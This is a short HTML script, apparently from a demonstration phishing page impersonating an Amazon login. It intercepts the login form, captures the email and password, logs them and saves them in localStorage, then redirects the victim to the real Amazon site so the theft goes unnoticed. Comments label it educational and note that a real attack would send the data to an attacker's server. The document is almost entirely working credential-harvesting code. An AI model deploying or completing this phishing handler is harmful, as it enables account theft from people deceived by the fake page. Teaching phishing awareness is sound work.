    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form values
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // In a real attack, this would send data to the attacker's server
            // For educational purposes, we'll just log to console and redirect
            console.log("Captured credentials:", { email, password });
            
            // Store credentials in localStorage (for demonstration only)
            localStorage.setItem('amazon_email', email);
            localStorage.setItem('amazon_password', password);
            
            // Redirect to the actual Amazon website
            window.location.href = "https://www.amazon.com";
        });
    </script>
